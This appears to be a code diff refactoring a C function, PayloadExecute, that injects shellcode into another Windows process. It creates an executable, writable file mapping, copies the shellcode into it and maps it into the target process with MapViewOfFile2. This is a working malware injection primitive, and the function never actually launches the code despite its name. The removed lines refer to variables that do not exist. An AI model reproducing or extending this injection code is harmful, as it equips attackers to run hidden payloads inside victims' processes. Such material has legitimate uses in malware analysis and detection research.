@@ -1,41 +1,41 @@
+#pragma comment(lib, "Onecore.lib")
 #pragma once
+#pragma comment(lib, "Onecoreuap.lib")
 #include <Windows.h>
 #include <stdio.h>
+#include <memoryapi.h>
 #include "api.h"
 
 BOOL PayloadExecute(IN HANDLE hProcess, IN OPTIONAL HANDLE hThread, IN PBYTE pShellcodeAddress, IN SIZE_T sShellcodeSize, OUT PBYTE* ppInjectionAddress, OUT OPTIONAL HANDLE* phThread) {
 
-	BOOL        bSTATE            = TRUE;
-	HANDLE      hFile             = NULL;
-	PVOID       pMapLocalAddress  = NULL,
-                pMapRemoteAddress = NULL;
+	HANDLE		hMappingFile			= NULL;
+	PBYTE		pLocalMappingAddress	= NULL,
+				pRemoteMappingAddress	= NULL;
 
-    
-	hFile = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, NULL, sPayloadSize, NULL);
-	if (hFile == NULL) {
-		printf("\t[!] CreateFileMapping Failed With Error : %d \n", GetLastError());
-		bSTATE = FALSE; goto _EndOfFunction;
-	}
-  
-	pMapLocalAddress = pMapViewOfFile(hFile, FILE_MAP_WRITE, NULL, NULL, sPayloadSize);
-	if (pMapLocalAddress == NULL) {
-		printf("\t[!] MapViewOfFile Failed With Error : %d \n", GetLastError());
-		bSTATE = FALSE; goto _EndOfFunction;
+	if (!hProcess || !pShellcodeAddress || !sShellcodeSize || !ppInjectionAddress)
+		return FALSE;
+
+	if (!(hMappingFile = CreateFileMappingW(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0x00, sShellcodeSize, NULL))) {
+		printf("[!] CreateFileMappingW Failed With Error: %d \n", GetLastError());
+		goto _END_OF_FUNC;
 	}
 
-	memcpy(pMapLocalAddress, pPayload, sPayloadSize);
-
-	pMapRemoteAddress = MapViewOfFile2(hFile, hProcess, NULL, NULL, NULL, NULL, PAGE_EXECUTE_READWRITE);
-	if (pMapRemoteAddress == NULL) {
-		printf("\t[!] MapViewOfFile2 Failed With Error : %d \n", GetLastError());
-		bSTATE = FALSE; goto _EndOfFunction;
+	if (!(pLocalMappingAddress = (PBYTE)MapViewOfFile(hMappingFile, FILE_MAP_WRITE, 0x00, 0x00, sShellcodeSize))) {
+		printf("[!] MapViewOfFile Failed With Error: %d \n", GetLastError());
+		goto _END_OF_FUNC;
 	}
 
-	printf("\t[+] Remote Mapping Address : 0x%p \n", pMapRemoteAddress);
+	memcpy(pLocalMappingAddress, pShellcodeAddress, sShellcodeSize);
 
-_EndOfFunction:
-	*ppAddress = pMapRemoteAddress;
-	if (hFile)
-		CloseHandle(hFile);
-	return bSTATE;
+	if (!(pRemoteMappingAddress = MapViewOfFile2(hMappingFile, hProcess, 0x00, NULL, 0x00, 0x00, PAGE_EXECUTE_READWRITE))) {
+		printf("[!] MapViewOfFileEx Failed With Error: %d \n", GetLastError());
+		goto _END_OF_FUNC;
+	}
+
+	*ppInjectionAddress = pRemoteMappingAddress;
+
+_END_OF_FUNC:
+	if (hMappingFile)
+		CloseHandle(hMappingFile);
+	return (*ppInjectionAddress) ? TRUE : FALSE;
 }
